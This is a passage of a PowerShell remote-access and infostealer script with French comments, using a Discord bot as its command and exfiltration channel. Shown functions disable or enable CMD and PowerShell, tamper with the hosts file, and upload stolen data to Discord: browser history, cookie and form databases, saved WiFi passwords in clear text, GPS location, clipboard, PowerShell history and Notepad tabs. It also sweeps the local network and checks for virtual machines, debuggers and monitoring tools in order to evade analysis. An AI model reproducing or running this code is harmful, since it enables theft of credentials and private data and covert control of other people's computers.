                    Remove-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction Stop
                    $removed = $true
                }
            }
        }
        
        # Toujours vérifier HKCU aussi
        $regPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
        if (Test-Path $regPath) {
            $prop = Get-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction SilentlyContinue
            if ($prop) {
                Remove-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction Stop
                $removed = $true
            }
        }
        
        if ($removed) {
            sendMsg -Message ":white_check_mark: ``CMD enabled`` :white_check_mark:"
        }
        else {
            sendMsg -Message ":white_check_mark: ``CMD is already enabled`` :white_check_mark:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to enable CMD: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function DisablePowerShell {
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        
        if ($isAdmin) {
            # Utiliser HKLM pour tous les utilisateurs
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
            
            $regPath2 = "HKLM:\Software\Policies\Microsoft\Windows\System"
            if (-not (Test-Path $regPath2)) {
                New-Item -Path $regPath2 -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
        }
        else {
            # Utiliser HKCU pour l'utilisateur actuel seulement
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
            
            $regPath2 = "HKCU:\Software\Policies\Microsoft\Windows\System"
            if (-not (Test-Path $regPath2)) {
                New-Item -Path $regPath2 -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -Value 1 -Type DWord -Force -ErrorAction Stop
        }
        
        sendMsg -Message ":white_check_mark: ``PowerShell disabled`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to disable PowerShell: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function EnablePowerShell {
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        $removed = $false
        
        if ($isAdmin) {
            # Vérifier et supprimer depuis HKLM
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
            if (Test-Path $regPath) {
                $prop = Get-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
                if ($prop) {
                    Remove-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
                    $removed = $true
                }
            }
            
            $regPath2 = "HKLM:\Software\Policies\Microsoft\Windows\System"
            if (Test-Path $regPath2) {
                $prop = Get-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
                if ($prop) {
                    Remove-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
                    $removed = $true
                }
            }
        }
        
        # Toujours vérifier HKCU aussi
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        if (Test-Path $regPath) {
            $prop = Get-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
            if ($prop) {
                Remove-ItemProperty -Path $regPath -Name "DisablePowerShell" -ErrorAction SilentlyContinue
                $removed = $true
            }
        }
        
        $regPath2 = "HKCU:\Software\Policies\Microsoft\Windows\System"
        if (Test-Path $regPath2) {
            $prop = Get-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
            if ($prop) {
                Remove-ItemProperty -Path $regPath2 -Name "DisablePowerShell" -ErrorAction SilentlyContinue
                $removed = $true
            }
        }
        
        if ($removed) {
            sendMsg -Message ":white_check_mark: ``PowerShell enabled`` :white_check_mark:"
        }
        else {
            sendMsg -Message ":white_check_mark: ``PowerShell is already enabled`` :white_check_mark:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to enable PowerShell: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

# --------------------------------------------------------------- URL FUNCTIONS ------------------------------------------------------------------------

Function OpenURL {
    param ([string]$Url)
    
    try {
        if ([string]::IsNullOrWhiteSpace($Url)) {
            sendMsg -Message ":octagonal_sign: ``No URL provided. Usage: OpenURL -Url http://example.com`` :octagonal_sign:"
            return
        }
        
        # Valider le format de l'URL
        if ($Url -notmatch '^https?://') {
            $Url = "http://$Url"
        }
        
        Start-Process $Url -ErrorAction Stop
        sendMsg -Message ":white_check_mark: ``URL opened: $Url`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to open URL: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function BlockURL {
    param ([string]$Url)
    
    try {
        if ([string]::IsNullOrWhiteSpace($Url)) {
            sendMsg -Message ":octagonal_sign: ``No URL provided. Usage: BlockURL -Url example.com`` :octagonal_sign:"
            return
        }
        
        # Vérifier les droits admin (nécessaire pour modifier hosts)
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
            sendMsg -Message ":octagonal_sign: ``Administrator privileges required to block URLs`` :octagonal_sign:"
            return
        }
        
        # Nettoyer l'URL (enlever http://, https://, www.)
        $domain = $Url -replace '^https?://', '' -replace '^www\.', '' -replace '/.*$', ''
        
        $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
        $hostsContent = Get-Content $hostsPath -ErrorAction Stop
        
        # Vérifier si déjà bloqué
        if ($hostsContent -match "127\.0\.0\.1\s+$domain") {
            sendMsg -Message ":octagonal_sign: ``URL already blocked: $domain`` :octagonal_sign:"
            return
        }
        
        # Ajouter l'entrée dans hosts
        Add-Content -Path $hostsPath -Value "127.0.0.1 $domain" -ErrorAction Stop
        sendMsg -Message ":white_check_mark: ``URL blocked: $domain`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to block URL: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function UnblockURL {
    param ([string]$Url)
    
    try {
        if ([string]::IsNullOrWhiteSpace($Url)) {
            sendMsg -Message ":octagonal_sign: ``No URL provided. Usage: UnblockURL -Url example.com`` :octagonal_sign:"
            return
        }
        
        # Vérifier les droits admin
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
            sendMsg -Message ":octagonal_sign: ``Administrator privileges required to unblock URLs`` :octagonal_sign:"
            return
        }
        
        # Nettoyer l'URL
        $domain = $Url -replace '^https?://', '' -replace '^www\.', '' -replace '/.*$', ''
        
        $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
        $hostsContent = Get-Content $hostsPath -ErrorAction Stop
        
        # Supprimer les lignes contenant ce domaine (avec échappement)
        $escapedDomain = [regex]::Escape($domain)
        $newContent = $hostsContent | Where-Object { $_ -notmatch "127\.0\.0\.1\s+$escapedDomain" }
        
        if ($newContent.Count -eq $hostsContent.Count) {
            sendMsg -Message ":octagonal_sign: ``URL not found in block list: $domain`` :octagonal_sign:"
            return
        }
        
        Set-Content -Path $hostsPath -Value $newContent -ErrorAction Stop
        sendMsg -Message ":white_check_mark: ``URL unblocked: $domain`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to unblock URL: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

# =============================================================== MAIN FUNCTIONS =========================================================================

# Scriptblock for info + loot to discord
$dolootjob = {
    param([string]$token, [string]$LootID)
    function sendFile {
        param([string]$sendfilePath)
    
        $url = "https://discord.com/api/v10/channels/$LootID/messages"
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("Authorization", "Bot $token")
        if ($sendfilePath) {
            if (Test-Path $sendfilePath -PathType Leaf) {
                $response = $webClient.UploadFile($url, "POST", $sendfilePath)
                Write-Host "Attachment sent to Discord: $sendfilePath"
            }
            else {
                Write-Host "File not found: $sendfilePath"
            }
        }
    }

    function sendMsg {
        param([string]$Message)
        $url = "https://discord.com/api/v10/channels/$LootID/messages"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        if ($Message) {
            $jsonBody = @{
                "content"  = "$Message"
                "username" = "$env:computername"
            } | ConvertTo-Json
            $wc.Headers.Add("Content-Type", "application/json")
            $response = $wc.UploadString($url, "POST", $jsonBody)
            $message = $null
        }
    }

    Function BrowserDB {
        sendMsg -Message ":arrows_counterclockwise: ``Getting Browser DB Files..`` :arrows_counterclockwise:"
        $temp = [System.IO.Path]::GetTempPath() 
        $tempFolder = Join-Path -Path $temp -ChildPath 'dbfiles'
        $googledest = Join-Path -Path $tempFolder -ChildPath 'google'
        $mozdest = Join-Path -Path $tempFolder -ChildPath 'firefox'
        $edgedest = Join-Path -Path $tempFolder -ChildPath 'edge'
        New-Item -Path $tempFolder -ItemType Directory -Force
        sleep 1
        New-Item -Path $googledest -ItemType Directory -Force
        New-Item -Path $mozdest -ItemType Directory -Force
        New-Item -Path $edgedest -ItemType Directory -Force
        sleep 1
        
        Function CopyFiles {
            param ([string]$dbfile, [string]$folder, [switch]$db)
            $filesToCopy = Get-ChildItem -Path $dbfile -Filter '*' -Recurse | Where-Object { $_.Name -like 'Web Data' -or $_.Name -like 'History' -or $_.Name -like 'formhistory.sqlite' -or $_.Name -like 'places.sqlite' -or $_.Name -like 'cookies.sqlite' }
            foreach ($file in $filesToCopy) {
                $randomLetters = -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object { [char]$_ })
                if ($db -eq $true) {
                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension + '.db'
                }
                else {
                    $newFileName = $file.BaseName + "_" + $randomLetters + $file.Extension 
                }
                $destination = Join-Path -Path $folder -ChildPath $newFileName
                Copy-Item -Path $file.FullName -Destination $destination -Force
            }
        } 
        
        $script:googleDir = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data"
        $script:firefoxDir = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles" -Directory | Where-Object { $_.Name -like '*.default-release' }; $firefoxDir = $firefoxDir.FullName
        $script:edgeDir = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data"
        copyFiles -dbfile $googleDir -folder $googledest -db
        copyFiles -dbfile $firefoxDir -folder $mozdest
        copyFiles -dbfile $edgeDir -folder $edgedest -db
        $zipFileName = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "dbfiles.zip")
        Compress-Archive -Path $tempFolder -DestinationPath $zipFileName
        Remove-Item -Path $tempFolder -Recurse -Force
        sendFile -sendfilePath $zipFileName
        sleep 1
        Remove-Item -Path $zipFileName -Recurse -Force
    }

    Function SystemInfo {
        sendMsg -Message ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"
        Add-Type -AssemblyName System.Windows.Forms
        # User Information
        $userInfo = Get-WmiObject -Class Win32_UserAccount
        $fullName = $($userInfo.FullName) ; $fullName = ("$fullName").TrimStart("")
        $email = (Get-ComputerInfo).WindowsRegisteredOwner
    
        # Other Users
        $users = "$($userInfo.Name)"
        $userString = "`nFull Name : $($userInfo.FullName)"
    
        # System Language
        $systemLocale = Get-WinSystemLocale
        $systemLanguage = $systemLocale.Name
    
        #Keyboard Layout
        $userLanguageList = Get-WinUserLanguageList
        $keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
    
        # OS Information
        $systemInfo = Get-WmiObject -Class Win32_OperatingSystem
        $OSString = "$($systemInfo.Caption)"
        $WinVersion = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
        $OSArch = "$($systemInfo.OSArchitecture)"
        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $Width = $Screen.Width; $Height = $Screen.Height
        $screensize = "${width} x ${height}"
    
        # Enumerate Windows Activation Date
        function Convert-BytesToDatetime([byte[]]$b) { 
            [long]$f = ([long]$b[7] -shl 56) -bor ([long]$b[6] -shl 48) -bor ([long]$b[5] -shl 40) -bor ([long]$b[4] -shl 32) -bor ([long]$b[3] -shl 24) -bor ([long]$b[2] -shl 16) -bor ([long]$b[1] -shl 8) -bor [long]$b[0]
            $script:activated = [datetime]::FromFileTime($f)
        }
        $RegKey = (Get-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\ProductOptions").ProductPolicy 
        $totalSize = ([System.BitConverter]::ToUInt32($RegKey, 0))
        $policies = @()
        $value = 0x14
        while ($true) {
            $keySize = ([System.BitConverter]::ToUInt16($RegKey, $value))
            $keyNameSize = ([System.BitConverter]::ToUInt16($RegKey, $value + 2))
            $keyDataSize = ([System.BitConverter]::ToUInt16($RegKey, $value + 6))
            $keyName = [System.Text.Encoding]::Unicode.GetString($RegKey[($value + 0x10)..($value + 0xF + $keyNameSize)])
            if ($keyName -eq 'Security-SPP-LastWindowsActivationTime') {
                Convert-BytesToDatetime($RegKey[($value + 0x10 + $keyNameSize)..($value + 0xF + $keyNameSize + $keyDataSize)])
            }
            $value += $keySize
            if (($value + 4) -ge $totalSize) {
                break
            }
        }
    
        # GPS Location Info
        Add-Type -AssemblyName System.Device
        $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $GeoWatcher.Start()
        while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) { Sleep -M 100 }  
        if ($GeoWatcher.Permission -eq 'Denied') { $GPS = "Location Services Off" }
        else {
            $GL = $GeoWatcher.Position.Location | Select Latitude, Longitude
            $GL = $GL -split " "
            $Lat = $GL[0].Substring(11) -replace ".$"
            $Lon = $GL[1].Substring(10) -replace ".$"
            $GPS = "LAT = $Lat LONG = $Lon"
        }
    
        # Hardware Information
        $processorInfo = Get-WmiObject -Class Win32_Processor; $processor = "$($processorInfo.Name)"
        $videocardinfo = Get-WmiObject Win32_VideoController; $gpu = "$($videocardinfo.Name)"
        $RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB) }
        $computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem | Out-String
        $computerSystemInfo = $computerSystemInfo -split "`r?`n" | Where-Object { $_ -ne '' } | Out-String
    
        # HDD Information
        $HddInfo = Get-WmiObject Win32_LogicalDisk | 
        Select-Object DeviceID, VolumeName, FileSystem, 
        @{Name = "Size_GB"; Expression = { "{0:N1} GB" -f ($_.Size / 1Gb) } }, 
        @{Name = "FreeSpace_GB"; Expression = { "{0:N1} GB" -f ($_.FreeSpace / 1Gb) } }, 
        @{Name = "FreeSpace_percent"; Expression = { "{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace))) } } | 
        Format-List
        $HddInfo = ($HddInfo | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }
    
        # Disk Health
        $DiskHealth = Get-PhysicalDisk | 
        Select-Object FriendlyName, OperationalStatus, HealthStatus | 
        Format-List
        $DiskHealth = ($DiskHealth | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }
    
        # Current System Metrics
        function Get-PerformanceMetrics {
            $cpuUsage = Get-Counter '\Processor(_Total)\% Processor Time' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $memoryUsage = Get-Counter '\Memory\% Committed Bytes In Use' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $diskIO = Get-Counter '\PhysicalDisk(_Total)\Disk Transfers/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
            $networkIO = Get-Counter '\Network Interface(*)\Bytes Total/sec' | Select-Object -ExpandProperty CounterSamples | Select-Object CookedValue
    
            return [PSCustomObject]@{
                CPUUsage    = "{0:F2}" -f $cpuUsage.CookedValue
                MemoryUsage = "{0:F2}" -f $memoryUsage.CookedValue
                DiskIO      = "{0:F2}" -f $diskIO.CookedValue
                NetworkIO   = "{0:F2}" -f $networkIO.CookedValue
            }
        }
        $metrics = Get-PerformanceMetrics
        $PMcpu = "CPU Usage: $($metrics.CPUUsage)%"
        $PMmu = "Memory Usage: $($metrics.MemoryUsage)%"
        $PMdio = "Disk I/O: $($metrics.DiskIO) transfers/sec"
        $PMnio = "Network I/O: $($metrics.NetworkIO) bytes/sec"
    
        #Anti-virus Info
        $AVinfo = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
        $AVinfo | ForEach-Object { $_.Trim() }
        $AVinfo = ($AVinfo | Out-String) -replace '^\s*$(\r?\n|\r)', '' | ForEach-Object { $_.Trim() }
    
        # Enumerate Network Public IP
        $computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
    
        # Saved WiFi Network Info
        $outssid = $null
        $a = 0
        $ws = (netsh wlan show profiles) -replace ".*:\s+"
        foreach ($s in $ws) {
            if ($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5) {
                $ssid = $s.Trim()
                if ($s -Match ":") {
                    $ssid = $s.Split(":")[1].Trim()
                }
                $pw = (netsh wlan show profiles name=$ssid key=clear)
                $pass = "None"
                foreach ($p in $pw) {
                    if ($p -Match "Key Content") {
                        $pass = $p.Split(":")[1].Trim()
                        $outssid += "SSID: $ssid | Password: $pass`n"
                    }
                }
            }
            $a++
        }
    
        # Get the local IPv4 address
        $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object SuffixOrigin -eq "Dhcp" | Select-Object -ExpandProperty IPAddress)
    
        if ($localIP -match '^(\d{1,3}\.\d{1,3}\.\d{1,3})\.\d{1,3}$') {
            $subnet = $matches[1]
    
            1..254 | ForEach-Object {
                Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $subnet.$_"
            }
    
            # Retrieve the list of computers in the subnet
            $Computers = (arp.exe -a | Select-String "$subnet.*dynam") -replace ' +', ',' | ConvertFrom-Csv -Header Computername, IPv4, MAC | Where-Object { $_.MAC -ne 'dynamic' } | Select-Object IPv4, MAC, Computername
    
            # Add Hostname property and build scan result
            $scanresult = ""
            $Computers | ForEach-Object {
                try {
                    $ip = $_.IPv4
                    $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
                }
                catch {
                    $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)" -Force
                }
    
                $scanresult += "IP Address: $($_.IPv4) `n"
                $scanresult += "MAC Address: $($_.MAC) `n"
                if ($_.Hostname) {
                    $scanresult += "Hostname: $($_.Hostname) `n"
                }
                $scanresult += "`n"
            }
        }
    
        $NearbyWifi = (netsh wlan show networks mode=Bssid | ? { $_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*" }).trim() | Format-Table SSID, Signal, Band
        $Wifi = ($NearbyWifi | Out-String)
    
    
        #Virtual Machine Detection Setup
        $isVM = $false
        $isDebug = $false
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $Width = $screen.Bounds.Width
        $Height = $screen.Bounds.Height
        $networkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null }
        $services = Get-Service
        $vmServices = @('vmtools', 'vmmouse', 'vmhgfs', 'vmci', 'VBoxService', 'VBoxSF')
        $manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
        $vmManufacturers = @('Microsoft Corporation', 'VMware, Inc.', 'Xen', 'innotek GmbH', 'QEMU')
        $model = (Get-WmiObject Win32_ComputerSystem).Model
        $vmModels = @('Virtual Machine', 'VirtualBox', 'KVM', 'Bochs')
        $bios = (Get-WmiObject Win32_BIOS).Manufacturer
        $vmBios = @('Phoenix Technologies LTD', 'innotek GmbH', 'Xen', 'SeaBIOS')
        $runningTaskManagers = @()
    
        # Debugger Check
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;
    
            public class DebuggerCheck {
                [DllImport("kernel32.dll")]
                public static extern bool IsDebuggerPresent();
    
                [DllImport("kernel32.dll", SetLastError=true)]
                public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
            }
"@
        $isDebuggerPresent = [DebuggerCheck]::IsDebuggerPresent()
        $isRemoteDebuggerPresent = $false
        [DebuggerCheck]::CheckRemoteDebuggerPresent([System.Diagnostics.Process]::GetCurrentProcess().Handle, [ref]$isRemoteDebuggerPresent) | Out-Null
        if ($isDebuggerPresent -or $isRemoteDebuggerPresent) {
            $script:isdebug = $true
        }
    
        #Virtual Machine Indicators
        $commonResolutions = @("1280x720", "1280x800", "1280x1024", "1366x768", "1440x900", "1600x900", "1680x1050", "1920x1080", "1920x1200", "2560x1440", "3840x2160")
        $vmChecks = @{"VMwareTools" = "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools"; "VMwareMouseDriver" = "C:\WINDOWS\system32\drivers\vmmouse.sys"; "VMwareSharedFoldersDriver" = "C:\WINDOWS\system32\drivers\vmhgfs.sys"; "SystemBiosVersion" = "HKLM:\HARDWARE\Description\System\SystemBiosVersion"; "VBoxGuestAdditions" = "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions"; "VideoBiosVersion" = "HKLM:\HARDWARE\Description\System\VideoBiosVersion"; "VBoxDSDT" = "HKLM:\HARDWARE\ACPI\DSDT\VBOX__"; "VBoxFADT" = "HKLM:\HARDWARE\ACPI\FADT\VBOX__"; "VBoxRSDT" = "HKLM:\HARDWARE\ACPI\RSDT\VBOX__"; "SystemBiosDate" = "HKLM:\HARDWARE\Description\System\SystemBiosDate"; }
        $taskManagers = @("taskmgr", "procmon", "procmon64", "procexp", "procexp64", "perfmon", "perfmon64", "resmon", "resmon64", "ProcessHacker")
        $currentResolution = "$Width`x$Height"
        if (!($commonResolutions -contains $currentResolution)) { $rescheck = "Resolution Check : FAIL" }else { $rescheck = "Resolution Check : PASS" }
        if ($vmManufacturers -contains $manufacturer) { $ManufaturerCheck = "Manufaturer Check : FAIL" }else { $ManufaturerCheck = "Manufaturer Check : PASS" }
        if ($vmModels -contains $model) { $ModelCheck = "Model Check : FAIL" }else { $ModelCheck = "Model Check : PASS" }
        if ($vmBios -contains $bios) { $BiosCheck = "Bios Check : FAIL" }else { $BiosCheck = "Bios Check : PASS" }
    
        foreach ($service in $vmServices) { if ($services -match $service) { $script:isVM = $true } }
        foreach ($check in $vmChecks.GetEnumerator()) { if (Test-Path $check.Value) { $script:isVM = $true } }
        foreach ($adapter in $networkAdapters) {
            $macAddress = $adapter.MACAddress -replace ":", ""
            if ($macAddress.StartsWith("080027")) { $script:isVM = $true }
            elseif ($macAddress.StartsWith("000569") -or $macAddress.StartsWith("000C29") -or $macAddress.StartsWith("001C14")) { $script:isVM = $true }
        }
    
        # List Running Task Managers
        foreach ($taskManager in $taskManagers) {
            if (Get-Process -Name $taskManager -ErrorAction SilentlyContinue) {
                $runningTaskManagers += $taskManager
            }
        }
        if (!($runningTaskManagers)) {
            $runningTaskManagers = "None Found.."
        }
    
        if ($isVM) {   
            $vmD = "FAIL!"
        }
        else {
            $vmD = "PASS"
        }
        if ($isDebug) {
            $debugD = "FAIL!"
        }
        else {
            $debugD = "PASS"
        }
        $vmDetect = "VM Check : $vmD"
        $debugDetect = "Debugging Check : $debugD"
    
    
        $clipboard = Get-Clipboard
        if (!($clipboard)) {
            $clipboard = "No Data Found.."
        }
        # History and Bookmark Data
        $Expression = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $Paths = @{
            'chrome_history'   = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            'chrome_bookmarks' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            'edge_history'     = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
            'edge_bookmarks'   = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
            'firefox_history'  = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            'opera_history'    = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
            'opera_bookmarks'  = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
        }
        $Browsers = @('chrome', 'edge', 'firefox', 'opera')
        $DataValues = @('history', 'bookmarks')
        $outpath = "$env:temp\Browsers.txt"
        foreach ($Browser in $Browsers) {
            foreach ($DataValue in $DataValues) {
                $PathKey = "${Browser}_${DataValue}"
                $Path = $Paths[$PathKey]
    
                $entry = Get-Content -Path $Path | Select-String -AllMatches $Expression | % { ($_.Matches).Value } | Sort -Unique
    
                $entry | ForEach-Object {
                    [PSCustomObject]@{
                        Browser  = $Browser
                        DataType = $DataValue
                        Content  = $_
                    }
                } | Out-File -FilePath $outpath -Append
            }
        }
        $entry = Get-Content -Path $outpath
        $entry = ($entry | Out-String)
    
        # System Information
        $COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object { [Wmi]($_.Dependent) } | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table; $usbdevices = ($COMDevices | Out-String)
        $process = Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath; $process = ($process | Out-String)
        $service = Get-CimInstance -ClassName Win32_Service | select State, Name, StartName, PathName | Where-Object { $_.State -like 'Running' }; $service = ($service | Out-String)
        $software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize; $software = ($software | Out-String)
        $drivers = Get-WmiObject Win32_PnPSignedDriver | where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
        $pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"; $pshistory = Get-Content $pshist -raw ; $pshistory = ($pshistory | Out-String) 
        $RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 100 FullName, LastWriteTime; $RecentFiles = ($RecentFiles | Out-String)
    
        function EnumNotepad {
            $appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
            $directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
            $matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory
            foreach ($dir in $matchingDirectories) {
                $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
                $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
                foreach ($fullFilePath in $listOfBinFiles) {
                    if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
                        continue
                    }
                    $seperator = ("=" * 60)
                    $SMseperator = ("-" * 60)
                    $seperator | Out-File -FilePath $outpath -Append
                    $filename = $fullFilePath.Name
                    $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
                    $isSavedFile = $contents[3]
                    if ($isSavedFile -eq 1) {
                        $lengthOfFilename = $contents[4]
                        $filenameEnding = 5 + $lengthOfFilename * 2
                        $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
                        "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
                        $filename | Out-File -FilePath $outpath -Append
                        $SMseperator | Out-File -FilePath $outpath -Append
                        Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append
    
                    }
                    else {
                        "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
                        $filename | Out-File -FilePath $outpath -Append
                        $SMseperator | Out-File -FilePath $outpath -Append
                        $filenameEnding = 0
                        $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
                        $delimeterEnd = [array]::IndexOf($contents, 3, $filenameEnding)
                        $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
                        $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })
                        $originalFileBytes = $contents[($delimeterEnd + 9 + $fileMarker.Length)..($contents.Length - 6)]
                        $originalFileContent = ""
                        for ($i = 0; $i -lt $originalFileBytes.Length; $i++) {
                            if ($originalFileBytes[$i] -ne 0) {
                                $originalFileContent += [char]$originalFileBytes[$i]
                            }
                        }
                        $originalFileContent | Out-File -FilePath $outpath -Append
                    }
                    "`n" | Out-File -FilePath $outpath -Append
                }
            }
        }
    
    
    
    
        $infomessage = "
==================================================================================================================================
      _________               __                           .__        _____                            __  .__               
     /   _____/__.__. _______/  |_  ____   _____           |__| _____/ ____\___________  _____ _____ _/  |_|__| ____   ____  
     \_____  <   |  |/  ___/\   __\/ __ \ /     \   ______ |  |/    \   __\/  _ \_  __ \/     \\__  \\   __\  |/  _ \ /    \ 
